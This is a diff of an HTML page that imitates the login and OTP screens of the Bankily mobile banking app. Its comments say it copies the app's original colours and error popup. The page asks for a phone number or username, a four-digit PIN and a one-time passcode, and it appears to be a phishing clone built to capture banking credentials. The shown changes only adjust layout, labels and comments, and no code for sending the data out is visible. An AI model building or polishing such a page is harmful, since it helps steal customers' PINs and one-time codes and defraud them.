@@ -6,10 +6,9 @@
     <title>Bankily - بنكيلي</title>
     <style>
         :root {
-            --primary-teal: #0093a2; /* درجة الفيروزي الأصلية للتطبيق */
-            --primary-yellow: #f8ba00; /* درجة الأصفر الأصلية للشريط السفلي */
+            --primary-teal: #0093a2;
+            --primary-yellow: #f8ba00;
             --bg-white: #ffffff;
-            --text-gray: #7d7d7d;
         }
 
         * {
@@ -45,7 +44,7 @@
             position: relative;
         }
 
-        /* شريط العنوان العلوي */
+        /* شريط العنوان العلوي للـ OTP */
         .app-header {
             background-color: var(--primary-teal);
             height: 65px;
@@ -78,7 +77,7 @@
             align-items: center;
         }
 
-        /* مساحة الشعار بالحجم الكبير المتناسق */
+        /* مساحة الشعار بالحجم الطبيعي للتطبيق */
         .brand-logo-space {
             width: 100%;
             height: 160px; 
@@ -95,7 +94,7 @@
             object-fit: contain;
         }
 
-        /* حاوية التوسيط للحقول في المنتصف تماماً */
+        /* حاوية التوسيط للحقول */
         .middle-fields-container {
             width: 100%;
             display: flex;
@@ -105,10 +104,10 @@
             margin-bottom: auto; 
         }
 
-        /* مجموعات الإدخال والمسافات المحكمة */
+        /* مجموعات الإدخال والمسافات الطبيعية */
         .input-group {
             width: 100%;
-            margin-bottom: 35px; 
+            margin-bottom: 30px; 
             position: relative;
             text-align: right;
         }
@@ -117,57 +116,56 @@
             display: block;
             font-size: 0.95rem;
             font-weight: bold;
-            color: #555;
+            color: #333;
             margin-bottom: 12px;
             padding-right: 5px;
         }
 
-        /* حاوية الحقل مع الأيقونة */
+        /* حاوية الحقل مع الأيقونة في اليسار */
         .input-wrapper {
             position: relative;
             width: 100%;
-            border-bottom: 1.5px solid #222; /* الخط السفلي النحيف الممتد */
+            border-bottom: 1.5px solid #222;
             padding-bottom: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
         }
 
-        /* حقل الهاتف النظيف من أي إطارات مستطيلة إضافية */
+        /* حقل الهاتف النظيف */
         .main-input {
-            width: 100%;
+            width: calc(100% - 35px);
             border: none;
             outline: none;
-            padding: 4px 5px 4px 40px;
+            padding: 4px 5px;
             font-size: 1.15rem;
             color: #333;
             background: transparent;
             direction: ltr !important;
             text-align: left !important;
-            unicode-bidi: plaintext !important;
         }
 
-        /* الأيقونات جهة اليسار بالنسبة للكتابة واليمين كحجم مطلق */
+        /* الأيقونات في مكانها الطبيعي (يسار الحقل) */
         .field-icon {
-            position: absolute;
-            right: auto;
-            left: 5px;
-            bottom: 6px;
             width: 22px;
             height: 22px;
             color: #222;
-            z-index: 5;
+            margin-left: 5px;
         }
 
-        /* حاوية الأرقام السرية */
+        /* حاوية أشرطة الرقم السري */
         .password-wrapper-box {
             display: flex;
             justify-content: flex-end;
+            align-items: center;
             width: 100%;
-            margin-top: 15px;
         }
 
         .password-container {
             display: flex;
             gap: 15px;
             direction: ltr !important;
+            margin-left: auto;
         }
 
         /* أشرطة الرقم السري */
@@ -183,42 +181,29 @@
             text-align: center !important; 
             direction: ltr !important;
             caret-color: #222 !important;
-            pointer-events: auto;
-            user-select: none !important;
             border-radius: 0 !important;
         }
-        
-        .password-field::selection {
-            background: transparent !important;
-        }
 
-        /* الجزء السفلي للروابط - ترتيب جمالي متناسق جهة اليمين والمنتصف */
-        .bottom-links-area {
-            margin-top: auto;
-            margin-bottom: 20px;
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        /* نقل جملة نسيت الرقم السري إلى مكانها اليميني المخصص والمميز */
-        .forgot-password-right-box {
-            width: 100%;
+        /* روابط التنقل ومواضعها الأصلية */
+        .forgot-password-link {
+            display: block;
             text-align: right;
+            margin-top: 15px;
             padding-right: 5px;
         }
 
-        .forgot-password-right-box a {
+        .forgot-password-link a {
             color: #222;
             text-decoration: underline;
             font-size: 0.95rem;
             font-weight: 500;
         }
 
-        .register-link-box {
-            text-align: center;
+        .bottom-links-area {
+            margin-top: auto;
+            margin-bottom: 20px;
             width: 100%;
+            text-align: center;
         }
 
         .register-link-box a {
@@ -228,7 +213,7 @@
             font-weight: 500;
         }
 
-        /* تخصيصات واجهة OTP وتوسيطها */
+        /* تخصيصات واجهة OTP */
         .otp-title {
             font-size: 0.95rem;
             font-weight: normal;
@@ -270,26 +255,18 @@
             font-weight: bold;
             outline: none;
             background: transparent;
-            direction: ltr !important;
             text-align: center !important;
+            direction: ltr !important;
             caret-color: #222 !important; 
-            pointer-events: auto;
-            user-select: none !important;
             border-radius: 0 !important;
         }
-        
-        .otp-field::selection {
-            background: transparent !important;
-        }
 
-        /* حقل العداد الزمني */
         .otp-timer-countdown {
             font-size: 1.1rem;
             font-weight: bold;
             color: #0c3e66;
             margin-bottom: 20px;
             text-align: center;
-            margin-top: 5px;
         }
 
         /* الزر السفلي الأصفر الثابت */
@@ -309,7 +286,7 @@
             opacity: 0.9;
         }
 
-        /* نافذة رسالة الخطأ المخصصة للتطبيق */
+        /* نافذة رسالة الخطأ المنبثقة التفاعلية */
         .custom-popup-overlay {
             position: absolute;
             top: 0;
@@ -396,10 +373,11 @@
             </div>
 
             <div class="middle-fields-container">
+                <!-- حقل اسم المستخدم أو رقم الهاتف -->
                 <div class="input-group">
                     <label>اسم المستخدم أو رقم الهاتف</label>
                     <div class="input-wrapper">
-                        <input type="text" id="usernameInput" class="main-input" maxlength="8" inputmode="numeric" placeholder="" oninput="handleUsernameInput(this)">
+                        <input type="text" id="usernameInput" class="main-input" maxlength="8" inputmode="numeric" oninput="handleUsernameInput(this)">
                         <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                             <circle cx="12" cy="12" r="10"/>
                             <path d="M18 19c0-2.21-2.69-4-6-4s-6 1.79-6 4"/>
@@ -408,14 +386,10 @@
                     </div>
                 </div>
 
+                <!-- حقل الرقم السري -->
                 <div class="input-group" style="margin-bottom: 5px;">
-                    <label>الالرقم السري</label>
+                    <label>الرقم السري</label>
                     <div class="input-wrapper" style="border-bottom: none; padding-bottom: 0;">
-                        <svg class="field-icon" style="bottom: 4px;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-                            <path d="M7 11V7a5 5 0 0 1 9.9-1"/>
-                        </svg>
-                        
                         <div class="password-wrapper-box">
                             <div class="password-container">
                                 <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 0)">
@@ -424,15 +398,23 @@
                                 <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 3)">
                             </div>
                         </div>
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                            <path d="M7 11V7a5 5 0 0 1 9.9-1"/>
+                        </svg>
                     </div>
                 </div>
             </div>
 
-            <!-- المساحة السفلية المحدثة للروابط بالتنسيق الجمالي الصحيح والمنفصل -->
-            <div class="bottom-links-area">
-                <div class="forgot-password-right-box">
+            <!-- جملة نسيت الرقم السري في مكانها الطبيعي تماماً تحت الحقل جهة اليمين -->
+            <div style="width: 100%;">
+                <div class="forgot-password-link">
                     <a href="#">نسيت الرقم السري ؟</a>
                 </div>
+            </div>
+
+            <!-- المساحة السفلية لجملة مستخدم جديد -->
+            <div class="bottom-links-area">
                 <div class="register-link-box">
                     <a href="#">مستخدم جديد ؟ سجل الآن!</a>
                 </div>
@@ -538,7 +520,7 @@
             field.addEventListener('drop', (e) => e.preventDefault());
         });
 
-        // تشغيل عداد الوقت التنازلي التفاعلي الحي للـ OTP تلقائياً
+        // تشغيل عداد الوقت التنازلي التفاعلي للـ OTP
         function startOtpTimer() {
             clearInterval(otpInterval);
             totalSeconds = 300; 
@@ -563,7 +545,7 @@
             document.getElementById('otpTimer').innerText = `${formattedMinutes}:${formattedSeconds} ثواني`;
         }
 
-        // إظهار نافذة الخطأ المخصصة المنبثقة المطابقة للتطبيق الأصلية
+        // إظهار نافذة الخطأ المخصصة المنبثقة
         function showErrorPopup(message) {
             document.getElementById('popupErrorMessage').innerText = message;
             document.getElementById('customErrorPopup').classList.remove('hidden');
